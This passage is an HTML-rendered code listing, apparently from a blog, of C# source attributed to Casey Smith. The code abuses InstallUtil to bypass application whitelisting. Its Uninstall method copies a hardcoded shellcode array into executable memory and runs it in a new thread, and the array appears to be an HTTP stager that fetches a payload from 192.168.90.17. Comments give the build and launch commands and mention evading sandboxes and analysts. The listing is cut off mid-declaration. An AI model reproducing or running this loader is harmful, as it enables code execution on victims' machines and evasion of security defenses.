class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Configuration.Install;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author: Casey Smith, Twitter: @subTee</span></span><br><span class="line"><span class="comment">License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">Step One:</span></span><br><span class="line"><span class="comment">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /out:exeshell.exe exeshell.cs</span></span><br><span class="line"><span class="comment">Step Two:</span></span><br><span class="line"><span class="comment">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe</span></span><br><span class="line"><span class="comment">See https://gist.github.comsubTee/0dc27475f141cc3a1b50 for details.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Exec</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Hello From Main...I Don&#x27;t Do Anything&quot;</span>);</span><br><span class="line"><span class="comment">//Add any behaviour here to throw off sandbox execution/analysts :)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">System.ComponentModel.RunInstaller(true)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Sample</span> : <span class="title">System.Configuration.Install.Installer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_RELEASE = <span class="number">0x8000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Uninstall</span>(<span class="params">System.Collections.IDictionary savedState</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//ShellCode.DoEvil();</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">byte</span>[] buf = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">798</span>] &#123; <span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x64</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x30</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf0</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x78</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x4a</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, <span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0xe3</span>, <span class="number">0x3c</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf4</span>, <span class="number">0x03</span>, <span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>, <span class="number">0xe2</span>, <span class="number">0x58</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>, <span class="number">0x86</span>, <span class="number">0x5d</span>, <span class="number">0x68</span>, <span class="number">0x6e</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x3a</span>, <span class="number">0x56</span>, <span class="number">0x79</span>, <span class="number">0xa7</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xe9</span>, <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5b</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x51</span>, <span class="number">0x51</span>, <span class="number">0x6a</span>, <span class="number">0x03</span>, <span class="number">0x51</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x57</span>, <span class="number">0x89</span>, <span class="number">0x9f</span>, <span class="number">0xc6</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xeb</span>, <span class="number">0x70</span>, <span class="number">0x5b</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x52</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x40</span>, <span class="number">0x84</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xeb</span>, <span class="number">0x55</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x83</span>, <span class="number">0xc3</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x6a</span>, <span class="number">0xff</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x06</span>, <span class="number">0x18</span>, <span class="number">0x7b</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0xc3</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xf6</span>, <span class="number">0x74</span>, <span class="number">0x04</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0xeb</span>, <span class="number">0x09</span>, <span class="number">0x68</span>, <span class="number">0xaa</span>, <span class="number">0xc5</span>, <span class="number">0xe2</span>, <span class="number">0x5d</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x68</span>, <span class="number">0x45</span>, <span class="number">0x21</span>, <span class="number">0x5e</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x57</span>, <span class="number">0x6a</span>, <span class="number">0x07</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xb7</span>, <span class="number">0x57</span>, <span class="number">0xe0</span>, <span class="number">0x0b</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xbf</span>, <span class="number">0x00</span>, <span class="number">0x2f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0xc7</span>, <span class="number">0x74</span>, <span class="number">0xb7</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xe9</span>, <span class="number">0x91</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe9</span>, <span class="number">0xc9</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe8</span>, <span class="number">0x8b</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x58</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0xf1</span>, <span class="number">0x72</span>, <span class="number">0x1c</span>, <span class="number">0xdc</span>, <span class="number">0x6a</span>, <span class="number">0x4a</span>, <span class="number">0x7d</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0x25</span>, <span class="number">0xdd</span>, <span class="number">0xd0</span>, <span class="number">0x7d</span>, <span class="number">0xc5</span>, <span class="number">0x05</span>, <span class="number">0xed</span>, <span class="number">0xa2</span>, <span class="number">0x7d</span>, <span class="number">0x45</span>, <span class="number">0x28</span>, <span class="number">0x10</span>, <span class="number">0x9c</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0x4e</span>, <span class="number">0x60</span>, <span class="number">0x5b</span>, <span class="number">0xba</span>, <span class="number">0xa3</span>, <span class="number">0x59</span>, <span class="number">0x65</span>, <span class="number">0x6f</span>, <span class="number">0xc3</span>, <span class="number">0x23</span>, <span class="number">0x8a</span>, <span class="number">0x66</span>, <span class="number">0xe1</span>, <span class="number">0x0a</span>, <span class="number">0xa1</span>, <span class="number">0xb9</span>, <span class="number">0xc5</span>, <span class="number">0xba</span>, <span class="number">0xd9</span>, <span class="number">0xda</span>, <span class="number">0xb9</span>, <span class="number">0x3e</span>, <span class="number">0x44</span>, <span class="number">0xb2</span>, <span class="number">0x44</span>, <span class="number">0xf5</span>, <span class="number">0xac</span>, <span class="number">0x7b</span>, <span class="number">0x12</span>, <span class="number">0x7a</span>, <span class="number">0x72</span>, <span class="number">0xf0</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0xf1</span>, <span class="number">0x66</span>, <span class="number">0x46</span>, <span class="number">0xe8</span>, <span class="number">0x64</span>, <span class="number">0xe0</span>, <span class="number">0x95</span>, <span class="number">0xc5</span>, <span class="number">0x17</span>, <span class="number">0x2a</span>, <span class="number">0x8d</span>, <span class="number">0x85</span>, <span class="number">0xa1</span>, <span class="number">0xda</span>, <span class="number">0xfb</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x2d</span>, <span class="number">0x41</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x6e</span>, <span class="number">0x74</span>, <span class="number">0x3a</span>, <span class="number">0x20</span>, <span class="number">0x4d</span>, <span class="number">0x6f</span>, <span class="number">0x7a</span>, <span class="number">0x69</span>, <span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x2f</span>, <span class="number">0x34</span>, <span class="number">0x2e</span>, <span class="number">0x30</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x63</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x62</span>, <span class="number">0x6c</span>, <span class="number">0x65</span>, <span class="number">0x3b</span>, <span class="number">0x20</span>, <span class="number">0x4d</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x20</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x30</span>, <span class="number">0x3b</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x64</span>, <span class="number">0x6f</span>, <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x4e</span>, <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0x36</span>, <span class="number">0x2e</span>, <span class="number">0x31</span>, <span class="number">0x29</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0xbd</span>, <span class="number">0xd9</span>, <span class="number">0x1f</span>, <span class="number">0x5e</span>, <span class="number">0xec</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0xf0</span>, <span class="number">0x58</span>, <span class="number">0x92</span>, <span class="number">0x00</span>, <span class="number">0x87</span>, <span class="number">0x53</span>, <span class="number">0x08</span>, <span class="number">0xb0</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0xc6</span>, <span class="number">0x8a</span>, <span class="number">0xde</span>, <span class="number">0x7e</span>, <span class="number">0xac</span>, <span class="number">0x96</span>, <span class="number">0xa4</span>, <span class="number">0x3d</span>, <span class="number">0x95</span>, <span class="number">0x9a</span>, <span class="number">0x3c</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x93</span>, <span class="number">0x8a</span>, <span class="number">0x64</span>, <span class="number">0x3f</span>, <span class="number">0x06</span>, <span class="number">0x48</span>, <span class="number">0x7e</span>, <span class="number">0xe5</span>, <span class="number">0xe5</span>, <span class="number">0x5f</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0xd9</span>, <span class="number">0x67</span>, <span class="number">0x04</span>, <span class="number">0x95</span>, <span class="number">0x6c</span>, <span class="number">0x1b</span>, <span class="number">0x1f</span>, <span class="number">0x25</span>, <span class="number">0xee</span>, <span class="number">0xdc</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0xe0</span>, <span class="number">0xca</span>, <span class="number">0xce</span>, <span class="number">0xd6</span>, <span class="number">0x5e</span>, <span class="number">0x7b</span>, <span class="number">0xd7</span>, <span class="number">0xe4</span>, <span class="number">0xc9</span>, <span class="number">0x0a</span>, <span class="number">0xde</span>, <span class="number">0xc0</span>, <span class="number">0x9c</span>, <span class="number">0xa6</span>, <span class="number">0xb5</span>, <span class="number">0xbc</span>, <span class="number">0x06</span>, <span class="number">0xd7</span>, <span class="number">0x86</span>, <span class="number">0xef</span>, <span class="number">0xf1</span>, <span class="number">0xf8</span>, <span class="number">0xa3</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x5b</span>, <span class="number">0xd6</span>, <span class="number">0x2f</span>, <span class="number">0x19</span>, <span class="number">0x52</span>, <span class="number">0x77</span>, <span class="number">0x42</span>, <span class="number">0x09</span>, <span class="number">0x84</span>, <span class="number">0xe3</span>, <span class="number">0xc5</span>, <span class="number">0x1b</span>, <span class="number">0xf5</span>, <span class="number">0x1d</span>, <span class="number">0x0d</span>, <span class="number">0x73</span>, <span class="number">0x2d</span>, <span class="number">0x1b</span>, <span class="number">0x38</span>, <span class="number">0xcc</span>, <span class="number">0x08</span>, <span class="number">0xd6</span>, <span class="number">0x2f</span>, <span class="number">0x83</span>, <span class="number">0x4c</span>, <span class="number">0x51</span>, <span class="number">0x0a</span>, <span class="number">0x60</span>, <span class="number">0x46</span>, <span class="number">0x28</span>, <span class="number">0x66</span>, <span class="number">0x6e</span>, <span class="number">0xea</span>, <span class="number">0x53</span>, <span class="number">0x08</span>, <span class="number">0x99</span>, <span class="number">0x0a</span>, <span class="number">0x92</span>, <span class="number">0x68</span>, <span class="number">0x88</span>, <span class="number">0xd8</span>, <span class="number">0x41</span>, <span class="number">0x3e</span>, <span class="number">0x1c</span>, <span class="number">0x16</span>, <span class="number">0x1a</span>, <span class="number">0x46</span>, <span class="number">0x31</span>, <span class="number">0x8c</span>, <span class="number">0xe4</span>, <span class="number">0xa8</span>, <span class="number">0x8c</span>, <span class="number">0xc5</span>, <span class="number">0xe3</span>, <span class="number">0xf0</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x1e</span>, <span class="number">0x2c</span>, <span class="number">0x8c</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x14</span>, <span class="number">0x26</span>, <span class="number">0xab</span>, <span class="number">0xed</span>, <span class="number">0xba</span>, <span class="number">0x0f</span>, <span class="number">0xc2</span>, <span class="number">0x80</span>, <span class="number">0xa5</span>, <span class="number">0xa5</span>, <span class="number">0x1b</span>, <span class="number">0xb3</span>, <span class="number">0x6c</span>, <span class="number">0xa0</span>, <span class="number">0x09</span>, <span class="number">0x55</span>, <span class="number">0xae</span>, <span class="number">0x66</span>, <span class="number">0xba</span>, <span class="number">0x95</span>, <span class="number">0x98</span>, <span class="number">0x0a</span>, <span class="number">0x7e</span>, <span class="number">0x6a</span>, <span class="number">0x6a</span>, <span class="number">0xc1</span>, <span class="number">0x03</span>, <span class="number">0x98</span>, <span class="number">0xc9</span>, <span class="number">0xfd</span>, <span class="number">0x4e</span>, <span class="number">0xde</span>, <span class="number">0x58</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0x6a</span>, <span class="number">0x87</span>, <span class="number">0xa7</span>, <span class="number">0xb8</span>, <span class="number">0xba</span>, <span class="number">0xf0</span>, <span class="number">0x31</span>, <span class="number">0x3a</span>, <span class="number">0x6a</span>, <span class="number">0x27</span>, <span class="number">0x81</span>, <span class="number">0xb5</span>, <span class="number">0x5b</span>, <span class="number">0x86</span>, <span class="number">0x7d</span>, <span class="number">0xb7</span>, <span class="number">0x08</span>, <span class="number">0x74</span>, <span class="number">0x53</span>, <span class="number">0x98</span>, <span class="number">0xb2</span>, <span class="number">0x59</span>, <span class="number">0x07</span>, <span class="number">0xe5</span>, <span class="number">0x1c</span>, <span class="number">0x85</span>, <span class="number">0xe9</span>, <span class="number">0x52</span>, <span class="number">0xef</span>, <span class="number">0x30</span>, <span class="number">0xfb</span>, <span class="number">0x16</span>, <span class="number">0xf4</span>, <span class="number">0xa1</span>, <span class="number">0xfc</span>, <span class="number">0x6a</span>, <span class="number">0x98</span>, <span class="number">0x19</span>, <span class="number">0x2a</span>, <span class="number">0x1e</span>, <span class="number">0xe1</span>, <span class="number">0x09</span>, <span class="number">0x3b</span>, <span class="number">0x39</span>, <span class="number">0x52</span>, <span class="number">0x4b</span>, <span class="number">0x91</span>, <span class="number">0x45</span>, <span class="number">0xb8</span>, <span class="number">0x74</span>, <span class="number">0xf2</span>, <span class="number">0x0f</span>, <span class="number">0xcf</span>, <span class="number">0xa9</span>, <span class="number">0xfa</span>, <span class="number">0x15</span>, <span class="number">0xc4</span>, <span class="number">0x5b</span>, <span class="number">0x47</span>, <span class="number">0xe7</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x93</span>, <span class="number">0xb9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xd9</span>, <span class="number">0x51</span>, <span class="number">0x53</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x68</span>, <span class="number">0x12</span>, <span class="number">0x96</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0xc6</span>, <span class="number">0x8b</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x75</span>, <span class="number">0xe5</span>, <span class="number">0x58</span>, <span class="number">0xc3</span>, <span class="number">0xe8</span>, <span class="number">0xa9</span>, <span class="number">0xfd</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x2e</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x2e</span>, <span class="number">0x31</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line">UInt32 funcAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Marshal.Copy(buf, <span class="number">0</span>, (IntPtr)(funcAddr), buf.Length);</span><br><span class="line">IntPtr hThread = IntPtr.Zero;</span><br><span class="line">UInt32 threadId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare data</span></span><br><span class="line"></span><br><span class="line">PROCESSOR_INFO info = <span class="keyword">new</span> PROCESSOR_INFO();</span><br><span class="line">IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(<span class="keyword">typeof</span>(PROCESSOR_INFO)));</span><br><span class="line">Marshal.StructureToPtr(info, pinfo, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute native code</span></span><br><span class="line"></span><br><span class="line">hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line">WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// retrive data</span></span><br><span class="line"></span><br><span class="line">info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, <span class="keyword">typeof</span>(PROCESSOR_INFO));</span><br><span class="line">Marshal.FreeHGlobal(pinfo);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">VirtualFree((IntPtr)funcAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">VirtualFree</span>(<span class="params">IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params"> UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="keyword">ref</span> UInt32 lpThreadId </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">CloseHandle</span>(<span class="params">IntPtr handle</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params"> IntPtr hHandle, UInt32 dwMilliseconds </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetModuleHandle</span>(<span class="params"> <span class="built_in">string</span> moduleName </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetProcAddress</span>(<span class="params"> IntPtr hModule, <span class="built_in">string</span> procName 